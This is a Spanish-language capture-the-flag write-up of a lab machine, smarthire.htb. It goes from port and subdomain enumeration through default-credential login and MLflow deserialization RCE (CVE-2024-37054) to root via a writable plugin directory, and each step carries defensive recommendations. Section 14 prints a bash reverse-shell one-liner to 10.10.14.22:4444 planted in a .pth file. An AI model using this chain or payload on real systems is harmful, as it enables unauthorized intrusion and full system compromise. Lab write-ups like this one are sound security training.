Informe de análisis y enumeración

1\. Escaneo inicial

Se realizó un escaneo de reconocimiento sobre el objetivo 10.129.221.157
con el fin de identificar los servicios expuestos y obtener una primera
visión de la superficie de ataque. Durante esta fase se detectaron
únicamente dos puertos abiertos: 22/tcp correspondiente al servicio SSH
y 80/tcp correspondiente al servicio web sobre nginx.

El escaneo también mostró que el servidor web redirigía hacia el dominio
smarthire.htb, por lo que fue necesario asociar ese nombre al host para
continuar con la enumeración del servicio.

Comando usado:

bash

nmap -sS \--open -sC -sV -n -Pn 10.129.221.157

<img width="1889" height="786" alt="image" src="https://github.com/user-attachments/assets/42756380-a013-452a-9d95-b5f3134bd423" />


Recomendaciones:

Restringir el acceso a SSH por IP o VPN.

Mantener actualizados los servicios expuestos.

Revisar si el host debe responder con redirecciones públicas.

2\. Enumeración web inicial

Tras configurar la resolución del dominio, se accedió a la página
principal del servicio web para revisar su contenido y comprobar si
existían puntos de interacción visibles. La interfaz no mostraba
elementos especialmente útiles ni formularios relevantes en primera
instancia, por lo que se realizó una revisión superficial del código
fuente y de las rutas más comunes.

Durante esta fase se comprobó que la web principal redirigía a /login,
lo que indicaba la existencia de un panel de autenticación para parte de
la aplicación.

Comandos usados:

bash

whatweb http://smarthire.htb

curl -I <http://smarthire.htb>

<img width="1308" height="713" alt="image" src="https://github.com/user-attachments/assets/741f00ee-7262-4a08-a5f8-a591cd0bd011" />


<img width="1267" height="933" alt="image" src="https://github.com/user-attachments/assets/ee453949-45bc-4e3b-af7a-85f3238302b1" />


Recomendaciones:

Ocultar información innecesaria en cabeceras HTTP.

Revisar que las páginas públicas no expongan rutas internas.

Proteger el panel de login con controles adicionales como MFA.

3\. Búsqueda de subdominios

Dado que el servidor web estaba montado sobre nginx, se planteó la
posibilidad de que el entorno funcionara mediante múltiples subdominios
o como un reverse proxy. Como la página principal no ofrecía apenas
interacción, se decidió centrar la enumeración en la búsqueda de hosts
virtuales asociados al dominio smarthire.htb.

Mediante fuzzing del encabezado Host se realizó una primera búsqueda de
subdominios, sin resultados visibles de interés. Sin embargo, al ampliar
la enumeración, apareció el subdominio models.smarthire.htb, que
respondía con código 401 Unauthorized, lo que confirmó la existencia de
un servicio adicional y protegido.

Comando usado:

bash

ffuf -w
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H
\"Host: FUZZ.smarthire.htb\" -u http://smarthire.htb -fs 0

<img width="1578" height="539" alt="image" src="https://github.com/user-attachments/assets/3b47d8e4-0683-4c39-91cd-10b024eac038" />


<img width="1882" height="713" alt="image" src="https://github.com/user-attachments/assets/5e32b6aa-8eb9-45c6-b2a2-dac3a716b366" />


Recomendaciones:

Reducir la superficie pública de subdominios no necesarios.

Proteger servicios internos con autenticación robusta.

Evitar banners o respuestas que faciliten el reconocimiento.

4\. Crawling y descubrimiento de rutas

Mientras se realizaba la búsqueda de subdominios, se aprovechó para
hacer crawling sobre la aplicación principal con el objetivo de
descubrir rutas y archivos ocultos. Esta fase permitió localizar
distintos recursos como /login, /register, varios ficheros relacionados
con tailwind dentro de /static/js/ y el archivo template.html.

Aunque estos hallazgos ampliaban el mapa inicial de la aplicación, el
descubrimiento del subdominio models.smarthire.htb hizo que esta vía
pasara a un segundo plano, al ofrecer una superficie de ataque más
prometedora.

Comando usado:

bash

katana -u http://smarthire.htb

<img width="736" height="627" alt="image" src="https://github.com/user-attachments/assets/7a2d3932-c214-4289-bfe5-bc6b35502b5d" />


Recomendaciones:

Revisar qué recursos estáticos son realmente necesarios.

Evitar dejar archivos de plantilla o pruebas accesibles.

Limpiar referencias internas visibles en el frontend.

5\. Acceso al subdominio

Al acceder a models.smarthire.htb se comprobó que el contenido estaba
expuesto públicamente. En ese momento no existía una barrera aparente de
autenticación y el servicio podía explorarse directamente desde el
navegador.

Una vez identificado este comportamiento, se comenzó a interactuar con
la aplicación para entender su funcionamiento interno y determinar si
existían puntos débiles aprovechables.

Comando usado:

bash

curl -i http://models.smarthire.htb


<img width="1477" height="709" alt="image" src="https://github.com/user-attachments/assets/cc6d8531-216d-49dd-bdb4-d986b6f5865d" />


Recomendaciones:

No exponer interfaces administrativas sin control de acceso.

Colocar el servicio detrás de un proxy con restricciones.

Registrar y monitorizar accesos a servicios internos.

6\. Validación de acceso

Tras revisar el comportamiento del subdominio, se comprobó que sí
existía un formulario de autenticación. Al principio no se sabia las
credenciales exactas, por lo que se realizaron varios intentos hasta
conseguir acceso. Dado que se trataba de un servicio expuesto en un
subdominio, se probaron credenciales sencillas como admin, test y
password, siguiendo una lógica básica de validación de accesos comunes.

tras identificar el formulario de acceso, se probaron credenciales por
defecto, consiguiendo autenticación con admin y password. Una vez dentro
de la aplicación, se realizó una primera enumeración del contenido
mediante curl y filtrado de cadenas, con el objetivo de localizar
posibles referencias a APIs, entornos de desarrollo o elementos de
administración. En esta revisión aparecieron varios indicios
relacionados con secciones orientadas a desarrolladores, como "API
Reference", aunque no se identificó todavía una funcionalidad claramente
explotable.

<img width="1889" height="906" alt="image" src="https://github.com/user-attachments/assets/1ca790f0-f025-4355-898c-221ee82472d1" />

<img width="2045" height="981" alt="image" src="https://github.com/user-attachments/assets/01d23ca4-5e85-4fd3-a9ec-9dc113c89d7d" />


Recomendaciones:

Aplicar políticas de contraseñas más estrictas.

Limitar intentos de autenticación.

Activar bloqueo o alertas ante pruebas repetidas.

7\. Identificación de la tecnología

Después de interactuar un rato con el subdominio y revisar cómo
funcionaba el servicio, se identificó que estaba basado en MLflow
2.14.1. A partir de ahí se probaron varios exploits públicos
relacionados con la tecnología, aunque no todos dieron resultado.

Uno de ellos sí fue compatible y permitió avanzar, ya que estaba
asociado a la vulnerabilidad CVE-2024-37054, relacionada con la
deserialización insegura de modelos en MLflow. La versión 2.14.1 aparece
como una de las afectadas por este problema.

<img width="1904" height="913" alt="image" src="https://github.com/user-attachments/assets/337a2435-76e0-4f2d-8743-af04faead8d4" />


Recomendaciones:

Mantener MLflow y dependencias siempre actualizadas.

Restringir la carga de modelos a fuentes confiables.

Evitar ejecutar artefactos no validados en entornos productivos.

8\. Explotación del servicio MLflow

Una vez validado el acceso al panel y confirmada la tecnología, se
utilizó un exploit público compatible con la versión detectada. El
proceso permitió registrar un modelo, manipular el artefacto
correspondiente y desencadenar la carga del modelo desde la aplicación
principal, lo que derivó en la ejecución remota de código.

Como resultado, se obtuvo una shell inversa en el sistema objetivo. El
repositorio elegido fue un PoC público para CVE-2024-37054 orientado a
MLflow RCE.

Comando usado:

bash

python3 exploit.py \--mlflow http://models.smarthire.htb

<img width="1680" height="806" alt="image" src="https://github.com/user-attachments/assets/0600c5a2-5287-4dcd-b3a7-02c72e7627cc" />


<img width="1709" height="820" alt="image" src="https://github.com/user-attachments/assets/25dbc7e4-07dc-4da8-8a4f-af37df33a337" />


Recomendaciones:

No permitir modelos de origen no verificado.

Ejecutar procesos de inferencia en sandbox.

Validar y aislar los artefactos antes de cargarlos.

9\. Acceso inicial al sistema

La shell obtenida correspondía al usuario svcweb. Desde ese punto se
realizó una primera enumeración del entorno para localizar archivos
relevantes de la aplicación web y entender mejor la estructura del
sistema.

Dentro del directorio de trabajo se encontraron ficheros como app.py,
config.py, .env, requirements.txt, smarthire.db, templates, static,
utils y wsgi.py, lo que confirmaba que se trataba de una aplicación
Python con base de datos local.

Comandos usados:

bash

script /dev/null

ls

<img width="1374" height="614" alt="image" src="https://github.com/user-attachments/assets/ede63552-a259-45a0-9e44-a0d6931a38ad" />


Recomendaciones:

Aislar credenciales y secretos fuera del código.

Proteger archivos .env y configuraciones sensibles.

Aplicar el principio de mínimo privilegio a la cuenta del servicio.

Recomendaciones:

No guardar credenciales en texto plano.

Usar variables seguras o gestores de secretos.

Revisar permisos de lectura sobre archivos de configuración.

10\. Enumeración del sistema

Una vez dentro del sistema como svcweb, se revisó el archivo /etc/passwd
para identificar usuarios locales y posibles cuentas de interés. En esta
revisión se observó la presencia del usuario lxd, además de la cuenta
del servicio svcweb.

A continuación, se intentó revisar la configuración de privilegios con
sudo -l con el objetivo de comprobar si existían permisos de ejecución
privilegiada o configuraciones mal definidas que pudieran ser útiles en
una fase posterior.

Comandos usados:

bash

cat /etc/passwd

sudo -l

<img width="2375" height="1139" alt="image" src="https://github.com/user-attachments/assets/3fadb14c-ed87-4ef4-889a-f571692240d8" />

<img width="2997" height="1438" alt="image" src="https://github.com/user-attachments/assets/3fbddb04-2274-4b08-a05a-848d8f131bca" />


Recomendaciones:

Revisar cuentas de sistema con permisos excesivos.

Limitar las reglas de sudo a lo estrictamente necesario.

Auditar grupos con permisos sobre recursos sensibles.

11\. Utilidad interna de administración

Durante la enumeración local se localizó el archivo
/opt/tools/mlflow_ctl/mlflowctl.py, una utilidad interna destinada a la
administración del servicio MLflow. El script permite ejecutar acciones
como status, backup-models y restart, y además incorpora un sistema de
plugins para cargar lógica específica del entorno.

Este hallazgo fue relevante porque mostraba una herramienta de
administración interna con capacidad para extender funcionalidades
mediante módulos auxiliares.

Comando usado:

bash

cat /opt/tools/mlflow_ctl/mlflowctl.py

<img width="1349" height="1241" alt="image" src="https://github.com/user-attachments/assets/6f383438-d761-43fe-8654-15dca0418aa0" />

Recomendaciones:

Restringir la ejecución de herramientas administrativas.

Revisar que los plugins solo se carguen desde rutas seguras.

Evitar scripts con privilegios elevados sin control estricto.

13\. Revisión de plugins y permisos

Al inspeccionar el directorio de plugins asociado a la utilidad interna,
se observó que existía un subdirectorio dev con permisos de escritura
para el grupo correspondiente, mientras que otros componentes
permanecían bajo control de root. Además, el usuario svcweb pertenecía
al grupo devs, lo que evidenciaba una configuración de permisos
potencialmente débil.

Este punto resultó especialmente interesante porque la herramienta
cargaba módulos adicionales desde esa ubicación, lo que ampliaba la
superficie de análisis del sistema.

Comandos usados:

bash

ls -la /opt/tools/mlflow_ctl/

ls -la /opt/tools/mlflow_ctl/plugins/

id

cd /opt/tools/mlflow_ctl/plugins/

<img width="1715" height="911" alt="image" src="https://github.com/user-attachments/assets/98fe8c8f-e328-4239-804e-87aa753f2bb9" />


Recomendaciones:

Revisar permisos de escritura en directorios de plugins.

Eliminar acceso de grupos no necesarios.

Separar claramente archivos de producción y desarrollo.

14\. Escalada a root

Tras comprobar que el usuario tenía permisos sobre la carpeta dev, se
aprovechó la ejecución de la utilidad con sudo para cargar contenido
controlado desde esa ruta. En una primera prueba la sesión se cerró de
forma accidental, por lo que fue necesario repetir el proceso hasta
conseguir una conexión estable.

Finalmente, al volver a ejecutar la herramienta con privilegios
elevados, se obtuvo una nueva shell con permisos de root, confirmando la
escalada completa sobre el sistema.

Comandos usados:

bash

echo \'import os; os.system(\"bash -c \\\"bash -i \>&
/dev/tcp/10.10.14.22/4444 0\>&1\\\"\")\' \>
/opt/tools/mlflow_ctl/plugins/dev/exploit.pth

sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

cat /root/root.txt

cat /home/svcweb/user.txt

<img width="2443" height="65" alt="image" src="https://github.com/user-attachments/assets/2aa2672a-952e-4521-95ec-15ba2eb6cc2e" />



<img width="2365" height="581" alt="image" src="https://github.com/user-attachments/assets/072914e5-2405-4992-9bd2-03529e1e5e0c" />

Recomendaciones:

Impedir que usuarios no administradores modifiquen plugins cargados por
servicios.

Revisar cualquier mecanismo de ejecución dinámica.

Ejecutar herramientas privilegiadas con rutas inmutables y controladas.
